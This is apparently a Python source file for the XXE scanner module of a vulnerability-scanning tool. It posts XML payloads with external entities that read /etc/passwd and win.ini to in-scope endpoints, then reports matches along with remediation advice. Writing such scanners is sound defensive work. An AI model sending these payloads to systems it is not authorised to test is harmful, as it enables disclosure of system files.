"""XML external entity (XXE) scanner (PRD §6.8 XXE).

In-band detection: posts an XML body declaring an external entity that reads a
local file, then matches the file's signature in the response. Blind/OOB XXE
(entity exfiltration to the callback server) is added once that infrastructure
lands. Read-only; extracted content is not stored verbatim.
"""

from __future__ import annotations

from collections.abc import AsyncIterator

import httpx

from hydra.core.context import ScanContext
from hydra.core.schemas import Confidence, Evidence, Finding, HttpMethod, Severity
from hydra.scanners.base_scanner import BaseScanner
from hydra.scanners.lfi import detect_lfi
from hydra.scanners.registry import register
from hydra.utils.logger import get_logger
from hydra.utils.scope import ScopeViolation

logger = get_logger("scanner.xxe")

SCANNER_NAME = "xxe"
MAX_TARGETS = 60


def xxe_payloads() -> list[str]:
    return [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<r>&xxe;</r>",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        "<r>&xxe;</r>",
    ]


@register
class XxeScanner(BaseScanner):
    name = SCANNER_NAME
    vuln_type = "xxe"

    def _targets(self, ctx: ScanContext) -> list[str]:
        urls = [ctx.config.target]
        urls += [ep.url for ep in ctx.endpoints if ep.method == HttpMethod.POST]
        urls += [
            ep.url
            for ep in ctx.endpoints
            if any(k in ep.url.lower() for k in ("xml", "soap", "api", "upload", "import"))
        ]
        seen: set[str] = set()
        unique: list[str] = []
        for url in urls:
            if url not in seen:
                seen.add(url)
                unique.append(url)
        return unique[:MAX_TARGETS]

    async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
        headers = {"Content-Type": "application/xml"}
        for url in self._targets(ctx):
            if not ctx.scope.is_allowed(url):
                continue
            for payload in xxe_payloads():
                try:
                    resp = await ctx.http.post(url, content=payload.encode(), headers=headers)
                except (ScopeViolation, httpx.HTTPError, httpx.InvalidURL) as exc:
                    logger.debug("xxe probe failed for %s: %s", url, exc)
                    continue
                matched = detect_lfi(resp.text)
                if matched:
                    yield Finding(
                        vuln_type="xxe",
                        title="XML external entity (XXE) injection",
                        severity=Severity.HIGH,
                        confidence=Confidence.FIRM,
                        url=url,
                        description=(
                            "The XML parser resolved an external entity and returned the contents "
                            f"of {matched}. XXE can lead to file disclosure, SSRF, and DoS."
                        ),
                        remediation=(
                            "Disable external entity and DTD processing in the XML parser "
                            "(e.g. defusedxml / FEATURE_SECURE_PROCESSING)."
                        ),
                        cwe="CWE-611",
                        scanner=SCANNER_NAME,
                        evidence=Evidence(
                            request_raw=payload,
                            matched_at=matched,
                            notes=f"{matched} contents returned via external entity",
                        ),
                    )
                    break


__all__ = ["XxeScanner", "xxe_payloads"]
